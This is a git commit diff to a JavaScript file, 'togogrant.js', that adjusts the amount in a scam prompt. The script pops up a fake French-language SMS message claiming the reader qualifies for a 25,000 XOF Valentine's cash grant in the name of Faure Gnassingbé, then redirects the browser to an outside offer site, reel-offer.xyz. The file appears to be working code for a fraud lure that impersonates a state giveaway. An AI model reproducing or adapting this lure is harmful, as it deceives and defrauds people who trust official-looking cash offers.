8b9a1e535183bd9d278149a9303aeaacd4510821
bigetijazz17 <bigetijazz17@gmail.com>
2025-02-07 07:39:00 +0100

    Update togogrant.js

--- togogrant.js
+++ togogrant.js
@@ -1,5 +1,5 @@
 
-var password = 'RECLAMER 45,000 XOF'
+var password = 'RECLAMER 25,000 XOF'
 password=prompt('SMS: Félicitations, vous êtes admissible à FAURE GNASSINGBÉ 25,000 XOF SUBVENTION EN ESPÈCES SAINT-VALENTIN POUR TOUS, Veuillez appuyer sur OK pour RECLAMER Prix ​​en espèces','RECLAMER 25,000 XOF');
 if (password != 'RECLAMER 25,000 XOF') {
 location.href='https://www.reel-offer.xyz/Retirer-25000XOF';
